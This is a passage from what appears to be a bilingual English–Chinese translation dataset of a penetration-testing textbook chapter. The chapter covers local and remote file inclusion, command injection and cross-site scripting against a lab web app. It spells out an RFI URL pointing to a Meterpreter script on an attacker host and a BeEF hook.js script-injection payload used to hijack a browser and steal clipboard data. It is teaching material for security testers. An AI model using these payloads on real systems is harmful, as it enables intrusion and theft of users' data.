    in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation") where the Zervit web server
    on the Windows XP target allowed us to download files from the target, such as
    a backup of the SAM and SYSTEM hives.
  id: totrans-78
  prefs: []
  type: TYPE_NORMAL
  zh: 另一个常见的Web应用漏洞是*本地文件包含*，即能够通过Web应用从应用程序或其他我们不应通过Web应用访问的文件系统读取文件。我们在[第8章](ch08.xhtml
    "第8章. 利用")中看到过一个例子，Windows XP目标上的Zervit Web服务器允许我们从目标下载文件，比如SAM和SYSTEM注册表文件的备份。
- en: Our bookservice app also suffers from local file inclusion. As user *Mike*,
    go to **Profile** ▸ **View Newsletters**. Click the first newsletter in the list
    to view the contents of the file, as shown in [Figure 14-14](ch14.xhtml#viewing_a_newsletter
    "Figure 14-14. Viewing a newsletter").
  id: totrans-79
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的bookservice应用也存在本地文件包含漏洞。作为用户*Mike*，转到**Profile** ▸ **View Newsletters**。点击列表中的第一个新闻通讯查看文件内容，如[图14-14](ch14.xhtml#viewing_a_newsletter
    "图14-14. 查看新闻通讯")所示。
- en: '![Viewing a newsletter](httpatomoreillycomsourcenostarchimages2030452.png.jpg)Figure 14-14. Viewing
    a newsletter'
  id: totrans-80
  prefs: []
  type: TYPE_NORMAL
  zh: '![查看新闻通讯](httpatomoreillycomsourcenostarchimages2030452.png.jpg)图14-14. 查看新闻通讯'
- en: Now resend the request, and capture it with Burp Proxy, as shown in [Figure 14-15](ch14.xhtml#captured_newsletter_request
    "Figure 14-15. Captured newsletter request").
  id: totrans-81
  prefs: []
  type: TYPE_NORMAL
  zh: 现在重新发送请求，并使用Burp Proxy捕获它，如[图14-15](ch14.xhtml#captured_newsletter_request "图14-15.
    捕获的新闻通讯请求")所示。
- en: '![Captured newsletter request](httpatomoreillycomsourcenostarchimages2030454.png.jpg)Figure 14-15. Captured
    newsletter request'
  id: totrans-82
  prefs: []
  type: TYPE_NORMAL
  zh: '![捕获的新闻通讯请求](httpatomoreillycomsourcenostarchimages2030454.png.jpg)图14-15.
    捕获的新闻通讯请求'
- en: Click the **Params** tab, and note the parameter *c:\inetpub\wwwroot\Book\NewsLetter\Mike@Mike.com\Web
    Hacking Review.txt*. The path *c:\inetpub\wwwroot\Book\NewsLetter\Mike* suggests
    that the newsletter functionality is pulling the newsletters from the local filesystem
    by their absolute path. It also looks like there’s a folder called *Mike@Mike.com*
    in the *Newsletter* folder. Perhaps each user subscribed to the newsletters has
    such as folder.
  id: totrans-83
  prefs: []
  type: TYPE_NORMAL
  zh: 点击**Params**标签，并注意参数*c:\inetpub\wwwroot\Book\NewsLetter\Mike@Mike.com\Web Hacking
    Review.txt*。路径*c:\inetpub\wwwroot\Book\NewsLetter\Mike*表明新闻通讯功能通过它们的绝对路径从本地文件系统中提取新闻通讯。看起来在*Newsletter*文件夹中有一个名为*Mike@Mike.com*的文件夹。也许每个订阅新闻通讯的用户都有这样的文件夹。
- en: It also seems as if our application is actually at the path *c:\inetpub\wwwroot\Book*,
    as noted in the newsletter requests, instead of *c:\inetpub\wwwroot\bookservice*
    as we might expect from the URL. We note this because it may come in handy later
    on.
  id: totrans-84
  prefs: []
  type: TYPE_NORMAL
  zh: 另外，我们似乎发现应用程序实际上位于路径*c:\inetpub\wwwroot\Book*，正如新闻订阅请求中所示，而不是我们从URL中可能预期的*c:\inetpub\wwwroot\bookservice*。我们注意到这一点，因为稍后它可能会派上用场。
- en: What if we change the filename parameter to another file in the web application?
    Can we gain access to the app’s full source code? For example, change the file
    to the following, and forward the request to the server.
  id: totrans-85
  prefs: []
  type: TYPE_NORMAL
  zh: 如果我们将文件名参数更改为Web应用程序中的另一个文件，会怎样呢？我们能否访问应用程序的完整源代码？例如，将文件更改为以下内容，然后将请求转发到服务器。
- en: '[PRE8]'
  id: totrans-86
  prefs: []
  type: TYPE_PRE
  zh: '[PRE8]'
- en: As you can see, the source code of the *Search.aspx* page is displayed in the
    Newsletter box, as shown in [Figure 14-16](ch14.xhtml#local_file_inclusion_vulnerability
    "Figure 14-16. Local file inclusion vulnerability").
  id: totrans-87
  prefs: []
  type: TYPE_NORMAL
  zh: 如你所见，*Search.aspx*页面的源代码在新闻订阅框中显示出来，如[图14-16](ch14.xhtml#local_file_inclusion_vulnerability
    "图14-16. 本地文件包含漏洞")所示。
- en: Having access to the full server-side source code of the web application allows
    us to do a complete source code review to look for issues.
  id: totrans-88
  prefs: []
  type: TYPE_NORMAL
  zh: 拥有Web应用程序完整的服务器端源代码使我们能够进行全面的源代码审查，寻找潜在问题。
- en: But perhaps we can access even more sensitive data. For example, we know that
    the usernames and passwords are stored in an XML file. Perhaps we can request
    this file. We don’t know its name, but a few guesses for common filenames in XML
    authentication scenarios will lead us to the filename *AuthInfo.xml*. Capture
    the newsletter request in Burp Proxy, and change the requested file to the one
    shown here.
  id: totrans-89
  prefs: []
  type: TYPE_NORMAL
  zh: 但或许我们还可以访问更敏感的数据。例如，我们知道用户名和密码存储在一个XML文件中。或许我们可以请求这个文件。我们不知道它的名称，但通过对常见XML认证场景中常见文件名的几次猜测，我们可以找到文件名*AuthInfo.xml*。在Burp
    Proxy中捕获新闻订阅请求，并将请求的文件更改为此处显示的文件。
- en: '![Local file inclusion vulnerability](httpatomoreillycomsourcenostarchimages2030456.png)Figure 14-16. Local
    file inclusion vulnerability'
  id: totrans-90
  prefs: []
  type: TYPE_NORMAL
  zh: '![本地文件包含漏洞](httpatomoreillycomsourcenostarchimages2030456.png)图14-16. 本地文件包含漏洞'
- en: '[PRE9]'
  id: totrans-91
  prefs: []
  type: TYPE_PRE
  zh: '[PRE9]'
- en: 'As you can see in [Figure 14-17](ch14.xhtml#authentication_info "Figure 14-17. Authentication
    info"), we now have access to the usernames and passwords in plaintext. Now we
    know why our previous Xpath injection logged us in as the user *Mike*: *Mike*
    is the first user in the file.'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: 如[图14-17](ch14.xhtml#authentication_info "图14-17. 认证信息")所示，我们现在可以访问明文的用户名和密码。现在我们知道为什么之前的Xpath注入让我们以用户*Mike*身份登录：*Mike*是文件中的第一个用户。
- en: This is a prime example of when using a proxy comes in handy. A user with just
    a browser would have been limited to only the files he or she could click on,
    namely the newsletters presented. On the other hand, with the proxy we are able
    to see the request ask for a specific file from the filesystem. By changing the
    filename manually in the request using Burp Proxy, we were able to see other sensitive
    files. No doubt the developer did not consider the possibility that the user could
    just ask for any file and, thus, did not think to limit the files that could be
    accessed through the user’s newsletters.
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: 这是使用代理工具非常有用的一个典型例子。一个只有浏览器的用户只能点击他或她能看到的文件，即展示的新闻订阅内容。另一方面，借助代理工具，我们能够看到请求从文件系统中请求特定文件。通过在Burp
    Proxy中手动更改请求中的文件名，我们能够看到其他敏感文件。毫无疑问，开发人员没有考虑到用户可以请求任何文件的可能性，因此未曾限制用户通过新闻订阅能够访问的文件。
- en: '![Authentication info](httpatomoreillycomsourcenostarchimages2030458.png)Figure 14-17. Authentication
    info'
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: '![认证信息](httpatomoreillycomsourcenostarchimages2030458.png)图14-17. 认证信息'
- en: 'Worse still, we aren’t limited to files from the web application. We can load
    any file from the filesystem that the IIS_USER has read access to. For example,
    if you create a file called *secret.txt* on the C: drive, you can load it through
    the newsletters functionality. Just substitute the file you want in the request
    in Burp Suite. If we can find a way to upload files to a web application, we can
    even use LFI vulnerability to execute malicious code on the webserver.'
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 更糟糕的是，我们不仅仅局限于来自Web应用程序的文件。我们可以加载IIS_USER具有读取权限的任何文件。例如，如果你在C盘创建一个名为*secret.txt*的文件，你可以通过新闻订阅功能加载它。只需在Burp
    Suite中的请求中替换你想要的文件。如果我们能够找到上传文件到Web应用程序的方法，我们甚至可以利用LFI漏洞在Web服务器上执行恶意代码。
- en: Remote File Inclusion
  id: totrans-96
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 远程文件包含
- en: Remote file inclusion (RFI) vulnerabilities allow attackers to load and execute
    malicious scripts, hosted elsewhere, on a vulnerable server. In [Chapter 8](ch08.xhtml
    "Chapter 8. Exploitation"), we used the open phpMyAdmin interface in XAMPP to
    write a simple PHP shell and finally a PHP version of Meterpreter to the web server.
    Though we are not uploading a file to the server here, the attack is similar.
    If we can trick the vulnerable server into executing a remote script, we can run
    commands on the underlying system.
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 远程文件包含（RFI）漏洞允许攻击者加载并执行托管在其他地方的恶意脚本，在脆弱的服务器上执行。在 [第 8 章](ch08.xhtml "第 8 章.
    利用")中，我们使用 XAMPP 中的开放 phpMyAdmin 界面写了一个简单的 PHP Shell，最终将 Meterpreter 的 PHP 版本写入了
    Web 服务器。虽然我们这里没有上传文件到服务器，但攻击方式相似。如果我们能欺骗脆弱的服务器执行一个远程脚本，就能在底层系统上运行命令。
- en: Our site does not have a remote file inclusion vulnerability, but simple vulnerable
    PHP code is shown here as an illustration.
  id: totrans-98
  prefs: []
  type: TYPE_NORMAL
  zh: 我们的网站没有远程文件包含漏洞，但这里展示了一个简单的脆弱 PHP 代码作为示例。
- en: '[PRE10]'
  id: totrans-99
  prefs: []
  type: TYPE_PRE
  zh: '[PRE10]'
- en: An attacker can host a malicious PHP script (such as the *meterpreter.php* script
    we used in [Chapter 8](ch08.xhtml "Chapter 8. Exploitation")) on their webserver
    and request the page with the file parameter set to *http://<attacker_ip>/meterpreter.php*.
    The RFI vulnerability would cause *meterpreter.php* to be executed by the webserver
    even though it is hosted elsewhere. Of course, our example application is ASP.net
    not PHP, but Msfvenom can create payloads in ASPX format for these sorts of apps.
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
  zh: 攻击者可以将恶意的 PHP 脚本（例如我们在 [第 8 章](ch08.xhtml "第 8 章. 利用") 中使用的 *meterpreter.php*
    脚本）托管在自己的 Web 服务器上，并请求带有文件参数的页面，参数设置为 *http://<attacker_ip>/meterpreter.php*。RFI
    漏洞将导致 *meterpreter.php* 被 Web 服务器执行，即使它托管在其他地方。当然，我们的示例应用程序是 ASP.net，而非 PHP，但
    Msfvenom 可以为此类应用程序创建 ASPX 格式的有效载荷。
- en: Command Execution
  id: totrans-101
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 命令执行
- en: As noted earlier, the *Newsletters* folder contains a folder called *Mike@Mike.com*.
    Logically, this suggests that the site may contain similar folders with the email
    addresses of all users signed up to receive newsletters. Some part of the application
    must be creating these folders as users register or sign up for the newsletter.
    The application’s code is probably running a command to create the folders on
    the filesystem. Perhaps, again through lack of input validation, we can run additional
    commands that the developer never intended us to run.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
  zh: 如前所述，*Newsletters* 文件夹中包含一个名为 *Mike@Mike.com* 的文件夹。从逻辑上讲，这表明该网站可能包含类似的文件夹，存放所有已注册接收简报的用户的电子邮件地址。应用程序的某些部分必须在用户注册或订阅简报时创建这些文件夹。该应用程序的代码可能正在运行命令，在文件系统中创建这些文件夹。也许，正因为缺乏输入验证，我们可以运行开发者本来不打算让我们运行的其他命令。
- en: As shown in [Figure 14-18](ch14.xhtml#newsletter_signup "Figure 14-18. Newsletter
    Signup"), the bottom right of the web app contains a form to sign up for newsletters.
    We suspect that when we enter an email address, a folder is created for that email
    address in the *newsletters* folder.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 如 [图 14-18](ch14.xhtml#newsletter_signup "图 14-18. 简报注册") 所示，网页应用的右下角包含一个注册简报的表单。我们怀疑，当我们输入电子邮件地址时，系统会在
    *newsletters* 文件夹中为该电子邮件地址创建一个文件夹。
- en: We guess that the email address input is fed to a system command to create a
    directory in the *newsletters* folder. If the developer does not properly sanitize
    user input, we may be able to run additional commands using the ampersand (`&`)
    symbol.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 我们猜测，电子邮件地址输入被传递给一个系统命令，用于在 *newsletters* 文件夹中创建一个目录。如果开发者没有正确清理用户输入，我们可能能够通过使用
    & 符号来运行额外的命令。
- en: '![Newsletter Signup](httpatomoreillycomsourcenostarchimages2030460.png.jpg)Figure 14-18. Newsletter
    Signup'
  id: totrans-105
  prefs: []
  type: TYPE_NORMAL
  zh: '![简报注册](httpatomoreillycomsourcenostarchimages2030460.png.jpg)图 14-18. 简报注册'
- en: We’ll execute a command and send its output to a file in our application’s *C:\inetpub\wwwroot\Book\*
    directory, then access the files directly to see the command’s output. Run the
    `ipconfig` command on the Windows 7 target as shown here to pipe the output from
    a system command such as `ipconfig` to the file *test.txt* in the *Book* directory.
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将执行一个命令，并将其输出发送到应用程序的 *C:\inetpub\wwwroot\Book\* 目录下的一个文件，然后直接访问文件，查看命令的输出。按照这里所示的方式，在
    Windows 7 目标机上运行 `ipconfig` 命令，将系统命令（如 `ipconfig`）的输出通过管道传送到 *Book* 目录中的文件 *test.txt*。
- en: '[PRE11]'
  id: totrans-107
  prefs: []
  type: TYPE_PRE
  zh: '[PRE11]'
- en: When we browse to *[http://192.168.20.12/bookservice/test.txt](http://192.168.20.12/bookservice/test.txt)*,
    we see the output of our `ipconfig` command, as shown in [Figure 14-19](ch14.xhtml#command_execution_output
    "Figure 14-19. Command execution output").
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们浏览到 *[http://192.168.20.12/bookservice/test.txt](http://192.168.20.12/bookservice/test.txt)*
    时，我们会看到 `ipconfig` 命令的输出，如 [图 14-19](ch14.xhtml#command_execution_output "图 14-19.
    命令执行输出") 所示。
- en: '![Command execution output](httpatomoreillycomsourcenostarchimages2030462.png.jpg)Figure 14-19. Command
    execution output'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
- en: 'We will be limited to the privileges of the Internet Information Services (IIS)
    user. Unfortunately for us, the Microsoft IIS application on Windows 7 systems
    runs as a separate account without the full privileges of a system user: a better
    security scenario for the developer but a more challenging one for us.'
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
- en: Though we don’t have full access, we will be able to gather a lot of information
    about the system with the access we do have. For example, we can use the `dir`
    command to find interesting files, or the command `netsh advfirewall firewall
    show rule name=all` to see the rules in the Windows firewall.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
- en: Since we are on a Windows system we cannot use `wget` from the command line
    to pull down an interactive shell, but we can use various other methods to do
    so. In [Chapter 8](ch08.xhtml "Chapter 8. Exploitation") we used TFTP to transfer
    a shell from our Kali system to the Windows XP target. Windows 7 does not have
    a TFTP client installed by default, but in Windows 7 we do have a powerful scripting
    language called *Powershell*, which we can use for tasks such as downloading and
    executing a file.
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-113
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'A study of Powershell is outside of the scope of this book, but it is very
    helpful for post exploitation on the latest Windows operating systems. A good
    reference can be found here: *[http://www.darkoperator.com/powershellbasics/](http://www.darkoperator.com/powershellbasics/)*.'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
- en: Cross-Site Scripting
  id: totrans-115
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Perhaps the most common and most debated web application security vulnerability
    is cross-site scripting (XSS). When such vulnerabilities are present, attackers
    can inject malicious scripts into an otherwise innocuous site to be executed in
    the user’s browser.
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
- en: 'XSS attacks are typically broken into two categories: stored and reflected.
    *Stored XSS attacks* are stored on the server and executed whenever a user visits
    the page where the script is stored. User forums, reviews, and other places where
    users can save input displayed to other users are ideal places for these sorts
    of attacks. *Reflective XSS attacks* are not stored on the server but are created
    by sending requests with the XSS attack itself. The attacks occur when user input
    is included in the server’s response, for example, in error messages or search
    results.'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
- en: Reflected XSS attacks rely on a user sending a request with the XSS attack included,
    so there will likely be some sort of social-engineering component to the attack
    as well. In fact, having XSS might actually increase the success of a social-engineering
    attack, because you can craft a URL that is part of a real website—a website the
    user knows and trusts—and use the XSS to, for instance, redirect the user to a
    malicious page. Like the other attacks discussed in this chapter, XSS attacks
    rely on a lack of user input sanitation, which allows us to create and run a malicious
    script.
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
- en: Checking for a Reflected XSS Vulnerability
  id: totrans-119
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: We should check any user input for XSS vulnerabilities. We’ll find that our
    application has a reflected XSS vulnerability in the search functionality. Try
    searching for the title *xss* in the Books Search box, as shown in [Figure 14-20](ch14.xhtml#search_function
    "Figure 14-20. Search function").
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
- en: As shown in [Figure 14-21](ch14.xhtml#search_results_page "Figure 14-21. Search
    results page"), the search results page prints the original user input as part
    of the results. If the user input is not properly sanitized, this may be where
    we can use XSS.
  id: totrans-121
  prefs: []
  type: TYPE_NORMAL
- en: '![Search function](httpatomoreillycomsourcenostarchimages2030464.png.jpg)Figure 14-20. Search
    function![Search results page](httpatomoreillycomsourcenostarchimages2030466.png)Figure 14-21. Search
    results page'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
- en: The typical first XSS test to try to run is a JavaScript alert box. The following
    code will attempt to put up a JavaScript alert with the text *xss*. If user input
    is not properly filtered, the script will be executed as part of the search results
    page.
  id: totrans-123
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  id: totrans-124
  prefs: []
  type: TYPE_PRE
  zh: '[PRE12]'
- en: In some cases, the user’s browser will automatically block obvious XSS attacks
    such as this one, and Iceweasel is one such browser. Switch over to your Windows
    7 target with Internet Explorer. As shown in [Figure 14-22](ch14.xhtml#xss_pop-up
    "Figure 14-22. XSS pop-up"), the pop-up alert script executes.
  id: totrans-125
  prefs: []
  type: TYPE_NORMAL
- en: '![XSS pop-up](httpatomoreillycomsourcenostarchimages2030468.png.jpg)Figure 14-22. XSS
    pop-up'
  id: totrans-126
  prefs: []
  type: TYPE_NORMAL
- en: Having determined that reflective XSS is present, we could try to leverage it
    to attack users. Common attacks include stealing session cookies to send to an
    attacker-controlled site or embedding a frame (a way of splitting an HTML page
    into different segments) to prompt the user for login credentials. A user may
    think that the frame is part of the original page and enter his or her credentials,
    which are then sent offsite to the attacker.
  id: totrans-127
  prefs: []
  type: TYPE_NORMAL
- en: Leveraging XSS with the Browser Exploitation Framework
  id: totrans-128
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: XSS issues tend to be overlooked. How much damage can an alert box that says
    “XSS” do anyway? A good tool for leveraging XSS issues and uncovering their true
    attack potential is the Browser Exploitation Framework (BeEF). Using BeEF, we
    can “hook” a browser by tricking the user into browsing to our BeEF server, or
    better yet using the BeEF JavaScript hook as a payload in the presence of an XSS
    vulnerability like the one discussed previously.
  id: totrans-129
  prefs: []
  type: TYPE_NORMAL
- en: Now change directories to */usr/share/beef-xss*, and run **`./beef`**, as shown
    in [Example 14-3](ch14.xhtml#starting_beef "Example 14-3. Starting BeEF"). This
    will start the BeEF server, including the web interface and the attack hook.
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
- en: Example 14-3. Starting BeEF
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  id: totrans-132
  prefs: []
  type: TYPE_PRE
  zh: '[PRE13]'
- en: Now in Kali, browse to *[http://192.168.20.9:3000/ui/panel](http://192.168.20.9:3000/ui/panel)*
    to access the BeEF web interface. You should be presented with a login page, like
    the one shown in [Figure 14-23](ch14.xhtml#beef_login_page "Figure 14-23. BeEF
    login page").
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
- en: '![BeEF login page](httpatomoreillycomsourcenostarchimages2030470.png.jpg)Figure 14-23. BeEF
    login page'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
- en: The default credentials for BeEF are *beef:beef*. After you enter them in the
    login dialog, you are shown the web interface ([Figure 14-24](ch14.xhtml#beef_web_interface
    "Figure 14-24. BeEF web interface")).
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
- en: '![BeEF web interface](httpatomoreillycomsourcenostarchimages2030472.png.jpg)Figure 14-24. BeEF
    web interface'
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
- en: Currently no browsers are hooked in BeEF, so we need to trick someone into loading
    and running BeEF’s malicious *hook.js* script. Let’s return to our XSS vulnerability
    in the Book Search box. This time, instead of using an alert dialog, let’s leverage
    the issue to load BeEF’s *hook.js* in the target browser. From the Windows 7 Internet
    Explorer browser, enter **`"<script src=http://192.168.20.9:3000/hook.js></script>"`**
    into the Book Search box, and click **Go**. This time there will be no alert box
    or other indication to the user suggesting that anything is amiss, but if you
    turn back to BeEF, you should see the IP address of the Windows 7 box in the Online
    Browsers list at the left of the screen, as shown in [Figure 14-25](ch14.xhtml#hooked_browser
    "Figure 14-25. A hooked browser").
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
- en: In the details pane, with the IP address of Windows 7 selected in BeEF, you
    can see details about the hooked browser as well as the underlying system, such
    as versions and installed software. At the top of the pane are additional tabs,
    such as Logs and Commands. Click **Commands** to see additional BeEF modules you
    can run against the hooked browser.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
- en: '![A hooked browser](httpatomoreillycomsourcenostarchimages2030474.png.jpg)Figure 14-25. A
    hooked browser'
  id: totrans-139
  prefs: []
  type: TYPE_NORMAL
- en: For example, as shown in [Figure 14-26](ch14.xhtml#running_a_beef_module "Figure 14-26. Running
    a BeEF module"), navigate to **Browser** ▸ **Hooked Domain** ▸ **Create Alert
    Dialog**. At the right of the screen, you have the option to change the alert
    text. When you finish, click **Execute** at the bottom right.
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
- en: '![Running a BeEF module](httpatomoreillycomsourcenostarchimages2030476.png.jpg)Figure 14-26. Running
    a BeEF module'
  id: totrans-141
  prefs: []
  type: TYPE_NORMAL
- en: Turn back to your Windows 7 browser. You should see the pop-up dialog, shown
    in [Figure 14-27](ch14.xhtml#causing_an_alert_in_the_hooked_browser "Figure 14-27. Causing
    an alert in the hooked browser").
  id: totrans-142
  prefs: []
  type: TYPE_NORMAL
- en: '![Causing an alert in the hooked browser](httpatomoreillycomsourcenostarchimages2030478.png.jpg)Figure 14-27. Causing
    an alert in the hooked browser'
  id: totrans-143
  prefs: []
  type: TYPE_NORMAL
- en: Another interesting BeEF command allows you to steal data from the Windows clipboard.
    On the Windows 7 system, copy some text to the clipboard. Now in BeEF, navigate
    in the Commands Module Tree to **Host** ▸ **Get Clipboard**. The text on the clipboard
    is displayed in the Command Results Pane on the right, as shown in [Figure 14-28](ch14.xhtml#stealing_clipboard_information
    "Figure 14-28. Stealing clipboard information").
  id: totrans-144
  prefs: []
  type: TYPE_NORMAL
- en: '![Stealing clipboard information](httpatomoreillycomsourcenostarchimages2030480.png.jpg)Figure 14-28. Stealing
    clipboard information'
  id: totrans-145
  prefs: []
  type: TYPE_NORMAL
- en: In this section we have looked at only two simple examples of leveraging a hooked
    browser with BeEF. There is plenty more we can do. For example, we can use the
    target browser as a pivot to start gathering information about the local network
    with ping sweeps or even port scans. You can even integrate BeEF with Metasploit.
    On your pentests, you can use BeEF as part of social-engineering attacks. If you
    can find an XSS in your client’s web server, you can improve the results of your
    campaign by directing users not to a attacker-owned site but rather to the company
    website they trust.
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
- en: Cross-Site Request Forgery
  id: totrans-147
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Cross-site scripting exploits the trust a user has in a website, whereas a
    similar vulnerability class called *cross-site request forgery (CSRF)* exploits
    a website’s trust in the user’s browser. Consider this scenario: A user is logged
    in to a banking website and has an active session cookie. Naturally, the user
    is also browsing to other websites in other tabs. The user opens a malicious website
    that contains a frame or image tag that triggers a HTTP request to the banking
    website with the correct parameters to transfer funds to another account (presumably
    the attacker’s account). The banking website, of course, checks to see that the
    user is logged in. Finding that the user’s browser has a currently active session,
    the banking website executes the command in the request, and the attacker steals
    the user’s money. The user, of course, never initiated the transaction—he just
    had the misfortune of browsing to a malicious website.'
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
- en: Web Application Scanning with w3af
  id: totrans-149
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: It is difficult to automate testing with a tool, particularly for custom applications.
    Nothing compares to a skilled web application tester with a proxy. That said,
    several commercial web application scanners and some free and open source scanners
    can automate tasks such as crawling the website and searching for known security
    issues.
  id: totrans-150
  prefs: []
  type: TYPE_NORMAL
- en: One open source web application scanner is the *Web Application Attack and Audit
    Framework (w3af)*. w3af is made up of plugins that perform different web application–testing
    tasks, such as looking for URLs and parameters to test and testing interesting
    parameters for SQL injection vulnerabilities.
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
- en: Now start w3af, as shown here.
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  id: totrans-153
  prefs: []
  type: TYPE_PRE
  zh: '[PRE14]'
- en: The w3af GUI will be launched and should look similar to [Figure 14-29](ch14.xhtml#using_w3af
    "Figure 14-29. Using w3af"). On the left of the screen are the scan configuration
    profiles. By default you are in an empty profile, which allows you to fully customize
    which w3af plugins are run against your target. You can also use several preconfigured
    profiles. For example, the *OWASP_Top10* profile will crawl the app with plugins
    from the discovery section as well as run plugins from the audit section that
    look for vulnerabilities from the Open Web Application Security Project (OWASP)’s
    top ten vulnerability categories. Enter the URL to be scanned, as shown in [Figure 14-29](ch14.xhtml#using_w3af
    "Figure 14-29. Using w3af"), and click **Start** at the right of the window.
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
- en: '![Using w3af](httpatomoreillycomsourcenostarchimages2030482.png.jpg)Figure 14-29. Using
    w3af'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
- en: As the scan runs, details will be shown in the Logs tab, and issues discovered
    will be added to the Results tab ([Figure 14-30](ch14.xhtml#w3af_results "Figure 14-30. w3af
    results")).
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
- en: '![w3af results](httpatomoreillycomsourcenostarchimages2030484.png.jpg)Figure 14-30. w3af
    results'
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
- en: w3af finds the SQL injection vulnerability that we exploited at the start of
    this chapter as well as some minor issues that are worth adding to your pentest
    report. You can try other w3af profiles or create your own, customizing which
    plugins are run against the app. w3af can even do a credentialed scan, in which
    it has an active logged-in session with the app, giving it access to additional
    functionality to search for issues.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  id: totrans-159
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: In this chapter we took a brief look at examples of common web application vulnerabilities
    in a sample application built without the input sanitation needed to mitigate
    many attacks. Our bookservice app has a SQL injection vulnerability in its books
    details page. We were able to extract data from the database and even get a system
    command shell.
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
- en: We found a similar injection vulnerability in the XML-based login functionality.
    We were able to use a crafted query to bypass authentication and log in as the
    first user stored in the *AuthInfo.xml* file. We were also able to use the newsletter
    page to see the source of arbitrary pages in the web application including the
    authentication information—the result of a lack of access control on the pages
    as well as a local file inclusion issue. We were able to run commands on the system
    by chaining them with the email address to sign up for newsletters, and we were
    able to write the output of commands to a file and then access them through the
    browser. We found an example of reflective XSS in the search functionality. We
    used BeEF to leverage this XSS issue and gain control of a target browser, giving
    us a foothold in the system. Finally, we looked briefly at an open source web
    vulnerability scanner, w3af.
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
- en: Web application testing deserves much more discussion than we can devote to
    it in this book. All the issues covered in this chapter are discussed in detail
    on OWASP’s website *[https://www.owasp.org/index.php/Main_Page/](https://www.owasp.org/index.php/Main_Page/)*,
    which is a good starting point for continuing your study of web application security.
    OWASP also publishes a vulnerable app, Webgoat, which uses exercises to give users
    hands-on experience exploiting web application issues like the ones in this chapter,
    as well as others. Working through Webgoat is a great next step if you want to
    learn more about testing web apps.
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
- en: Another thing to note is that our application is an ASP.net application running
    on Windows. In your pentesting career, you will encounter other kinds of applications,
    such as Apache/PHP/MySQL applications running on Linux, or a Java web application.
    You may also find yourself testing applications that use APIs such as REST and
    SOAP to transfer data. Though the underlying issues caused by lack of input sanitation
    can occur on any platform, the particular coding mistakes and the syntax to exploit
    them may vary. Be sure to become familiar with different kinds of applications
    as you continue to study web application security.
  id: totrans-163
  prefs: []
  type: TYPE_NORMAL
